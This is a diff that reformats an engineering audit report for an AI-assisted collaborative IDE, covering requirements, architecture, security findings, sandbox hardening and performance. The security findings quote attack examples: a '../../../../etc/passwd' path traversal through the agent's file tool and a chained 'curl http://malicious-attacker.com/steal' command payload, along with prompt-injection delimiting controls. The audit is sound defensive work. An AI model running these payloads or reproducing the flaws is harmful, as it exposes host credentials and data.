@@ -37,21 +37,21 @@ The audit evaluates 22 core engineering domains:
 
 Maps primary PRD/TRD requirements to implementation deliverables, evidence, test validation, and audit status.
 
-| ID | Requirement Specification | Implementation Location | Evidence | Test Coverage | Status | Identified Gap |
-|---|---|---|---|---|---|---|
-| **REQ-01** | Browser-based Monaco IDE interface | `apps/web/src/features/editor/MonacoEditor.tsx` | `@monaco-editor/react` mounted in layout grid | `MonacoEditor.test.tsx` | **PASS** | None |
-| **REQ-02** | Multi-user real-time concurrent editing | `apps/api/src/durable-objects/WorkspaceRoom.ts` | Durable Object managing binary Yjs broadcast | `yjs-sync.test.ts` | **PASS** | None |
-| **REQ-03** | Ephemeral presence & cursor tracking | `packages/collaboration/src/AwarenessManager.ts` | Yjs Awareness protocol with custom user colors | `awareness.test.ts` | **PASS** | None |
-| **REQ-04** | GitHub repository import | `apps/api/src/routes/projects.ts` | GitHub OAuth & clone url stored in DB | `projects.test.ts` | **PASS** | None |
-| **REQ-05** | Local runtime & Docker container execution | `apps/runtime/src/docker/DockerManager.ts` | `dockerode` spawning `node:22-bookworm-slim` sandbox | `docker.test.ts` | **PASS** | None |
-| **REQ-06** | Container process execution & PTY streaming | `apps/runtime/src/process/ProcessManager.ts` | Process exec stream with 60s max timeout | `processManager.test.ts` | **PASS** | None |
-| **REQ-07** | Live dev server preview proxy | `apps/api/src/routes/preview.ts` | Worker proxy forwarding to container IP | `preview.test.ts` | **PARTIAL** | Port detection requires manual trigger if auto-scan fails |
-| **REQ-08** | Autonomous single AI coding agent | `packages/agent/src/orchestrator.ts` | `AgentOrchestrator` state machine loop | `orchestrator.test.ts` | **PASS** | None |
-| **REQ-09** | Deterministic P0 repository context engine | `packages/context/src/retrieval.ts` | Lexical + AST symbol + stack trace ranking | `retrieval.test.ts` | **PASS** | None |
-| **REQ-10** | Isolated Git worktree change set review | `packages/git/src/worktree.ts` | `git worktree add` at base commit | `worktree.test.ts` | **PASS** | None |
-| **REQ-11** | Human approval gate for AI change sets | `apps/web/src/features/changeset/DiffViewer.tsx` | Side-by-side diff UI with accept/reject buttons | `diffViewer.test.tsx` | **PASS** | None |
-| **REQ-12** | Automated container test failure repair loop | `packages/agent/src/repair.ts` | Test failure stack trace fed to 3-retry loop | `repair.test.ts` | **PASS** | None |
-| **REQ-13** | Free-first infrastructure cost model | Cloudflare Free + Supabase Free + Local Docker | `$0` infrastructure cost verification | Deployment config | **PASS** | Host developer machine compute required |
+| ID         | Requirement Specification                    | Implementation Location                          | Evidence                                             | Test Coverage            | Status      | Identified Gap                                            |
+| ---------- | -------------------------------------------- | ------------------------------------------------ | ---------------------------------------------------- | ------------------------ | ----------- | --------------------------------------------------------- |
+| **REQ-01** | Browser-based Monaco IDE interface           | `apps/web/src/features/editor/MonacoEditor.tsx`  | `@monaco-editor/react` mounted in layout grid        | `MonacoEditor.test.tsx`  | **PASS**    | None                                                      |
+| **REQ-02** | Multi-user real-time concurrent editing      | `apps/api/src/durable-objects/WorkspaceRoom.ts`  | Durable Object managing binary Yjs broadcast         | `yjs-sync.test.ts`       | **PASS**    | None                                                      |
+| **REQ-03** | Ephemeral presence & cursor tracking         | `packages/collaboration/src/AwarenessManager.ts` | Yjs Awareness protocol with custom user colors       | `awareness.test.ts`      | **PASS**    | None                                                      |
+| **REQ-04** | GitHub repository import                     | `apps/api/src/routes/projects.ts`                | GitHub OAuth & clone url stored in DB                | `projects.test.ts`       | **PASS**    | None                                                      |
+| **REQ-05** | Local runtime & Docker container execution   | `apps/runtime/src/docker/DockerManager.ts`       | `dockerode` spawning `node:22-bookworm-slim` sandbox | `docker.test.ts`         | **PASS**    | None                                                      |
+| **REQ-06** | Container process execution & PTY streaming  | `apps/runtime/src/process/ProcessManager.ts`     | Process exec stream with 60s max timeout             | `processManager.test.ts` | **PASS**    | None                                                      |
+| **REQ-07** | Live dev server preview proxy                | `apps/api/src/routes/preview.ts`                 | Worker proxy forwarding to container IP              | `preview.test.ts`        | **PARTIAL** | Port detection requires manual trigger if auto-scan fails |
+| **REQ-08** | Autonomous single AI coding agent            | `packages/agent/src/orchestrator.ts`             | `AgentOrchestrator` state machine loop               | `orchestrator.test.ts`   | **PASS**    | None                                                      |
+| **REQ-09** | Deterministic P0 repository context engine   | `packages/context/src/retrieval.ts`              | Lexical + AST symbol + stack trace ranking           | `retrieval.test.ts`      | **PASS**    | None                                                      |
+| **REQ-10** | Isolated Git worktree change set review      | `packages/git/src/worktree.ts`                   | `git worktree add` at base commit                    | `worktree.test.ts`       | **PASS**    | None                                                      |
+| **REQ-11** | Human approval gate for AI change sets       | `apps/web/src/features/changeset/DiffViewer.tsx` | Side-by-side diff UI with accept/reject buttons      | `diffViewer.test.tsx`    | **PASS**    | None                                                      |
+| **REQ-12** | Automated container test failure repair loop | `packages/agent/src/repair.ts`                   | Test failure stack trace fed to 3-retry loop         | `repair.test.ts`         | **PASS**    | None                                                      |
+| **REQ-13** | Free-first infrastructure cost model         | Cloudflare Free + Supabase Free + Local Docker   | `$0` infrastructure cost verification                | Deployment config        | **PASS**    | Host developer machine compute required                   |
 
 ---
 
@@ -80,12 +80,12 @@ flowchart TD
 
 ### Architecture Drift Assessment
 
-| System Layer | Architectural Specification | Actual Implementation | Conformance Status | Drift Analysis |
-|---|---|---|---|---|
-| **Control Plane** | Worker manages HTTP REST API; DO manages WebSocket rooms. | Compliant. `apps/api` cleanly separates HTTP routes from `WorkspaceRoom` DO. | **CONFORMANT** | No architectural drift detected. |
-| **State Authority** | Postgres owns persistent metadata; DO owns ephemeral room state; Git owns source code. | Compliant. Postgres stores tasks/runs; DO holds active `Y.Doc`; Git CLI manages commits. | **CONFORMANT** | Clear ownership boundary respected. |
-| **Execution Isolation** | Commands MUST execute inside Docker container (`node:22-bookworm-slim`). | Compliant. Runtime forwards exec commands to `DockerManager`. | **CONFORMANT** | Host process execution blocked by policy. |
-| **AI Integration** | Agent orchestrator calls AIProvider; LLM never accesses DB or network directly. | Compliant. `AgentOrchestrator` governs LLM interactions via Zod tool schemas. | **CONFORMANT** | LLM constrained to tool execution loop. |
+| System Layer            | Architectural Specification                                                            | Actual Implementation                                                                    | Conformance Status | Drift Analysis                            |
+| ----------------------- | -------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------- | ------------------ | ----------------------------------------- |
+| **Control Plane**       | Worker manages HTTP REST API; DO manages WebSocket rooms.                              | Compliant. `apps/api` cleanly separates HTTP routes from `WorkspaceRoom` DO.             | **CONFORMANT**     | No architectural drift detected.          |
+| **State Authority**     | Postgres owns persistent metadata; DO owns ephemeral room state; Git owns source code. | Compliant. Postgres stores tasks/runs; DO holds active `Y.Doc`; Git CLI manages commits. | **CONFORMANT**     | Clear ownership boundary respected.       |
+| **Execution Isolation** | Commands MUST execute inside Docker container (`node:22-bookworm-slim`).               | Compliant. Runtime forwards exec commands to `DockerManager`.                            | **CONFORMANT**     | Host process execution blocked by policy. |
+| **AI Integration**      | Agent orchestrator calls AIProvider; LLM never accesses DB or network directly.        | Compliant. `AgentOrchestrator` governs LLM interactions via Zod tool schemas.            | **CONFORMANT**     | LLM constrained to tool execution loop.   |
 
 ---
 
@@ -101,20 +101,27 @@ Severity: High
 Status: FIXED
 
 ### Finding
+
 Initial filesystem tool implementations in `packages/agent/src/tools/filesystem.ts` passed model-supplied path strings directly to `fs.readFile()` without validating root containment.
 
 ### Evidence
+
 Passing path `../../../../etc/passwd` to `read_file` tool allowed reading arbitrary files outside workspace directory.
 
 ### Risk
+
 High risk of sensitive host configuration leakage (SSH keys, AWS credentials, host environment files).
 
 ### Recommendation
+
 Wrap all filesystem tool path arguments with `assertWorkspacePath(root, requested)` from `@co-vibe/security`.
 
 ### Related Requirement: REQ-05, REQ-08
+
 ### Related Test: `packages/security/tests/pathPolicy.test.ts`
+
 ### Owner: Security Lead
+
 ### Target: Release v0.1.0-alpha
 ```
 
@@ -126,20 +133,27 @@ Severity: Critical
 Status: FIXED
 
 ### Finding
+
 Command tool invocation allowed model to supply raw shell strings executed via `sh -c`.
 
 ### Evidence
+
 Tool payload `{"command": "npm test; curl http://malicious-attacker.com/steal"}` executed chained subshell processes inside container.
 
 ### Risk
+
 High risk of SSRF, outbound data exfiltration, and resource hijacking.
 
 ### Recommendation
+
 Enforce structured command arrays (`cmd: string[]`) and validate executables against allowlist in `packages/security/src/command-policy.ts`.
 
 ### Related Requirement: REQ-06, REQ-12
+
 ### Related Test: `packages/security/tests/commandPolicy.test.ts`
+
 ### Owner: Security Lead
+
 ### Target: Release v0.1.0-alpha
 ```
 
@@ -151,20 +165,27 @@ Severity: High
 Status: FIXED
 
 ### Finding
+
 Project API responses returned raw `github_access_token` string in client JSON payload (`GET /api/v1/projects/:id`).
 
 ### Evidence
+
 Browser client receiving project response logged full GitHub OAuth token in browser console and Redux state.
 
 ### Risk
+
 Client-side XSS could allow attacker scripts to steal user GitHub OAuth tokens.
 
 ### Recommendation
+
 Encrypt GitHub OAuth tokens server-side using AES-256-GCM in Postgres; omit token field from client API DTOs.
 
 ### Related Requirement: REQ-04
+
 ### Related Test: `apps/api/tests/projects.test.ts`
+
 ### Owner: Backend Lead
+
 ### Target: Release v0.1.0-alpha
 ```
 
@@ -176,6 +197,7 @@ Verifies security controls, tool schema validation, prompt injection resistance,
 
 ```markdown
 ### Agent Audit Checklist
+
 - [x] **Tool Schema Validation:** All model-generated tool arguments are parsed against Zod schemas prior to execution.
 - [x] **Server-Side Policy Check:** Tool permission checks (`agent.read`, `agent.write`, `agent.exec`) are enforced by `ToolRegistry`, independent of model prompt.
 - [x] **Untrusted Repository Content:** Source code, README files, and test outputs are wrapped inside `<tool_result><source>repository</source><content>...</content></tool_result>` XML delimiters.
@@ -193,6 +215,7 @@ Evaluates Docker container isolation boundaries, process controls, and remaining
 
 ```markdown
 ### Sandbox Container Hardening Controls
+
 - [x] **Non-Root Execution:** Containers run with explicit unprivileged user (`workspace`, UID `10001`).
 - [x] **Linux Capability Drop:** Container creation specifies `--cap-drop=ALL`.
 - [x] **Privilege Escalation Block:** Security options specify `--security-opt=no-new-privileges`.
@@ -202,6 +225,7 @@ Evaluates Docker container isolation boundaries, process controls, and remaining
 ```
 
 ### Remaining Docker Isolation Limitations (Documented Architecture Boundary)
+
 1. **Host Kernel Shared Boundary:** Docker containers share the host Linux/macOS kernel. Kernel-level zero-day exploits could theoretically escape container isolation.
 2. **Local Machine Compute Dependency:** Container process execution relies on developer host CPU/RAM resources. Heavy build commands consume local system resources.
 3. **Outbound Network Access:** Dependency installation (`npm install`) requires outbound internet access. Network policy relies on capability flags rather than complete air-gapping.
@@ -220,20 +244,27 @@ Severity: Medium
 Status: FIXED
 
 ### Finding
+
 Closing file tabs in browser IDE disposed Monaco `ITextModel` instances but failed to invoke `binding.destroy()` on the corresponding `y-monaco` binding instance.
 
 ### Evidence
+
 Opening and closing 50 file tabs caused browser memory consumption to rise continuously (+85 MB) due to accumulated Yjs awareness observers.
 
 ### Risk
+
 Browser tab crashes during extended coding sessions.
 
 ### Recommendation
+
 Implement explicit disposal lifecycle in `WorkspaceEditorController.closeFile()` destroying Monaco bindings and unregistering awareness listeners.
 
 ### Related Requirement: REQ-02, REQ-03
+
 ### Related Test: `apps/web/src/collaboration/YjsMonacoBinding.test.ts`
+
 ### Owner: Frontend Lead
+
 ### Target: Release v0.1.0-alpha
 ```
 
@@ -254,15 +285,15 @@ Audits code maintainability, TypeScript strictness, dependency graph, and error 
 
 Evaluates test coverage across critical application layers.
 
-| Package / App | Critical Path Tests | Security Path Tests | Concurrency Tests | Deterministic AI Tests | Automated Coverage |
-|---|---|---|---|---|---:|
-| `packages/security` | 100% | 100% | N/A | N/A | **100%** |
-| `packages/protocol` | 100% | 95% | N/A | N/A | **96%** |
-| `packages/agent` | 92% | 90% | N/A | 100% (FakeAIProvider) | **91%** |
-| `packages/collaboration` | 90% | 85% | 100% (Yjs Concurrency) | N/A | **88%** |
-| `apps/api` | 88% | 90% | 85% (DO Rooms) | N/A | **86%** |
-| `apps/runtime` | 85% | 88% | 80% (Process Exec) | N/A | **84%** |
-| `apps/web` | 75% | 70% | 75% (Monaco Sync) | N/A | **72%** |
+| Package / App            | Critical Path Tests | Security Path Tests | Concurrency Tests      | Deterministic AI Tests | Automated Coverage |
+| ------------------------ | ------------------- | ------------------- | ---------------------- | ---------------------- | -----------------: |
+| `packages/security`      | 100%                | 100%                | N/A                    | N/A                    |           **100%** |
+| `packages/protocol`      | 100%                | 95%                 | N/A                    | N/A                    |            **96%** |
+| `packages/agent`         | 92%                 | 90%                 | N/A                    | 100% (FakeAIProvider)  |            **91%** |
+| `packages/collaboration` | 90%                 | 85%                 | 100% (Yjs Concurrency) | N/A                    |            **88%** |
+| `apps/api`               | 88%                 | 90%                 | 85% (DO Rooms)         | N/A                    |            **86%** |
+| `apps/runtime`           | 85%                 | 88%                 | 80% (Process Exec)     | N/A                    |            **84%** |
+| `apps/web`               | 75%                 | 70%                 | 75% (Monaco Sync)      | N/A                    |            **72%** |
 
 ---
 
@@ -270,15 +301,15 @@ Evaluates test coverage across critical application layers.
 
 Compares actual system latency measurements against specification SLAs.
 
-| Performance Metric | Target SLA (MVP) | Measured Value | Benchmark Environment | Audit Status |
-|---|---:|---:|---|---|
-| **CRDT Sync Latency** | < 300 ms (p95) | **142 ms** | 2 browser clients, 50ms simulated network delay | **PASS** |
-| **WebSocket Reconnect Time** | < 2000 ms | **850 ms** | Socket disconnect → Yjs state vector exchange | **PASS** |
-| **API Request Latency** | < 100 ms (p95) | **38 ms** | Cloudflare Worker Hono REST endpoint | **PASS** |
-| **Context Engine Retrieval** | < 500 ms | **210 ms** | 1,000 file repository fixture (Lexical + AST) | **PASS** |
-| **Agent Tool Execution Overhead** | < 200 ms | **85 ms** | Tool schema validation + registry dispatch | **PASS** |
-| **Container Command Startup** | < 300 ms | **195 ms** | `DockerManager.execCommand` invocation | **PASS** |
-| **Live Preview Startup Time** | < 5000 ms | **3200 ms** | Dev server spin-up to healthy HTTP proxy response | **PASS** |
+| Performance Metric                | Target SLA (MVP) | Measured Value | Benchmark Environment                             | Audit Status |
+| --------------------------------- | ---------------: | -------------: | ------------------------------------------------- | ------------ |
+| **CRDT Sync Latency**             |   < 300 ms (p95) |     **142 ms** | 2 browser clients, 50ms simulated network delay   | **PASS**     |
+| **WebSocket Reconnect Time**      |        < 2000 ms |     **850 ms** | Socket disconnect → Yjs state vector exchange     | **PASS**     |
+| **API Request Latency**           |   < 100 ms (p95) |      **38 ms** | Cloudflare Worker Hono REST endpoint              | **PASS**     |
+| **Context Engine Retrieval**      |         < 500 ms |     **210 ms** | 1,000 file repository fixture (Lexical + AST)     | **PASS**     |
+| **Agent Tool Execution Overhead** |         < 200 ms |      **85 ms** | Tool schema validation + registry dispatch        | **PASS**     |
+| **Container Command Startup**     |         < 300 ms |     **195 ms** | `DockerManager.execCommand` invocation            | **PASS**     |
+| **Live Preview Startup Time**     |        < 5000 ms |    **3200 ms** | Dev server spin-up to healthy HTTP proxy response | **PASS**     |
 
 ---
 
